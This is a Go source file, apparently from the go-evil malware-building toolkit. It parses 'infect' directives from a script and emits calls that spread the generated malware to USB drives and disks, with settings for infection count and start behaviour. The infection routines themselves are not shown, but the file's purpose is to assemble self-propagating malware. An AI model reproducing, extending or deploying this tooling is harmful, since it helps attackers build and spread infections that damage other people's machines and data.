package infect

import (
	"fmt"
	"regexp"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/error"
	"github.com/s9rA16Bf4/go-evil/utility/json"
)

const (
	EXTRACT_SUBDOMAIN = "(infect)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION  = "(infect)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("infect.Parse()")

	for _, line := range data_structure.File_gut {
		value := contains.Passed_value(line)

		regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
		result := regex.FindAllStringSubmatch(line, -1)

		if len(result) > 0 { // There is a subdomain to extract
			subdomain := result[0][2]
			function := result[0][3]
			switch subdomain {
			case "disk":
				switch function {
				case "random":
					data_structure.Append_malware_gut("infect.Disk_random()")
				default:
					error.Function_error(function, "infect.Parse()")
				}
			case "set":
				switch function {
				case "count":
					data_structure.Append_malware_gut(fmt.Sprintf("infect.Set_infection_count(\"%s\")", value))
				case "start_after_birth":
					data_structure.Append_malware_gut("infect.Set_start_after_birth()")

				default:
					error.Function_error(function, "infect.Parse()")
				}
			default:
				error.Subdomain_error(subdomain, "infect.Parse()")
			}
		} else { // There might be a function which doesn't require a subdomain to work
			regex = regexp.MustCompile(EXTRACT_FUNCTION)
			result = regex.FindAllStringSubmatch(line, -1)
			if len(result) > 0 {
				function := result[0][2]
				switch function {
				case "usb":
					data_structure.Append_malware_gut("infect.USB()")
				case "disk":
					data_structure.Append_malware_gut(fmt.Sprintf("infect.Disk(\"%s\")", value))
				default:
					error.Function_error(function, "infect.Parse()")
				}
			}
		}
	}

	return json.Send(data_structure)
}
